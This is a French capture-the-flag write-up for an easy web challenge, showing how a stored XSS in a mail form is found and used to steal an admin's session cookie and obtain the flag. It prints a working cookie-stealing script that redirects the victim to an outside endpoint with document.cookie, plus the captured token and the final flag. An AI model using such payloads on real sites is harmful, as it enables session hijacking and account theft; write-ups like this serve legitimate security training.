# Du bazar dans la cuisine !

## Difficulté : facile

### Description :

Des rumeurs bizzares courrent à propos de Télécook, nous t'avons envoyé un mail à propos.
Connecte-toi sur <url_xss>, tu y trouveras toutes les informations nécessaires.

### Analyse

Nous sommes en face d'un challenge de web. L'interface peut sembler complexe à première vue mais au final, on se rend compte que l'on a accès qu'à seulement trois pages : la boîte de réception, celle des mails envoyés et la page pour envoyer un mail.

La page de réception semble n'être utile que pour nous donner des informations, nous ne pouvons pas intéragir avec, à part pour lire les messages. On y apprend cependant que l'on doit se connecter en tant qu'utilisateur Télécook, dont nous avons l'adresse mail `telecook@telecom-paris.fr` grâce à un mail qu'ils nous ont gentilment envoyé. On constate aussi que des balises HTML sont utilisées. Peut être, est-il possible d'insérer du code HTML (et javascript?) dans nos mails.

La page boîte d'envoi ne semble pas utile pour le moment, mais elle servira sûrement à voir les messages que nous avons envoyé, et pourquoi pas tester nos payloads ;)

Enfin, la page *Nouveau message* semble la plus intéressante. On peut envoyer des emails et il s'agit surtout du seul point d'entrée pour des attaques ! On aurait aussi pu noter le champ **id** de la requête GET, mais on constate vite qu'il n'y a pas d'injections possibles. De plus, le nom du challenge nous met directement sur la piste des cookies.

On teste alors un payload simple afin de voir si une XSS est présente.
```html
<script>alert('XSS?')</script>
```
Lorsque nous retournons sur notre page boîte d'envoi, nous avons bien notre mail, et si nous cliquons dessus, une fenêtre apparaît !

Plus qu'à forger le bon payload

### Exploitation

A l'aide d'un endpoint par exemple, https://imphackt.free.beeceptor.com nous allons récupérer une requête envoyée par télécook.
Nous devons pour cela le rediriger vers notre endpoint en passant en paramètres ses cookies. Cela donne par exemple:
```html
<script>document.location.replace('https://imphackt.free.beeceptor.com?cookie=' + document.cookie)</script>
```
On envoie et quelques minutes plus tard, on reçoit une conexion sur notre endpoint avec en paramètres de délicieux cookies dont un attire particulièrement notre attention: `ADMIN_TOKEN=T3LeC0oK_5uP3R_Co0K1e!!!`

On rajoute le dit cookie à notre navigateur (sous firefox shift+F9 puis +) en prenant garde à ce qu'il soit valide sur tout le site, on recharge, et magie ! nous voilà sur la boîte de télécook.

On regarde les mails et un mail envoyé nous donne une recette, qui ressemble étrangement à un flag.

Il faudrait faire
$$CTF101\left\{ md5(viande + oignon + 2 * tomate)\right\}$$

Après ce simple calcul, nous avons enfin notre flag :)

### Solution

flag: CTF101{ea138e0e3c9ca3193ebf6a4e66cefaa9}